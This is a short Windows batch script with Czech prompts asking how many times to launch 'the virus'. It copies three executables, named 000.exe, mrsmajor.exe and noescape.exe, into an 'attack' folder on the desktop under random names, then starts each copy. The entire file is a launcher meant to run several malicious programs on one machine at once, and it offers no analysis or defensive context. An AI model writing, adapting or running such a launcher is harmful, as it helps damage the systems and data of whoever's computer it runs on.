@echo off
mkdir c:\users\%username%\desktop\attack
color 4f
cls
echo Zadejte pocet spusteni viru
set /a a=0
set /p soubory=   Pocet: 
color
cls
:e
if %a% == %soubory% goto end
set /a r=%random%
set /a r=%random%
set /a r=%random%
copy c:\000.exe c:\users\%username%\desktop\attack\%r%.exe
set /a s%a%=%r%
set /a a=%a%+1
color 2
if %a% == %soubory% goto end
set /a r=%random%
set /a r=%random%
set /a r=%random%
copy c:\mrsmajor.exe c:\users\%username%\desktop\attack\%r%.exe
set /a s%a%=%r%
set /a a=%a%+1
color 6
if %a% == %soubory% goto end
set /a r=%random%
set /a r=%random%
set /a r=%random%
copy c:\noescape.exe c:\users\%username%\desktop\attack\%r%.exe
set /a s%a%=%r%
set /a a=%a%+1
color 4
goto e
:end
color 64
set /a b=0
:b
if %a%==%b% exit
set /a st=s%b%
start c:\users\%username%\desktop\attack\%st%.exe
set /a b=%b%+1
goto b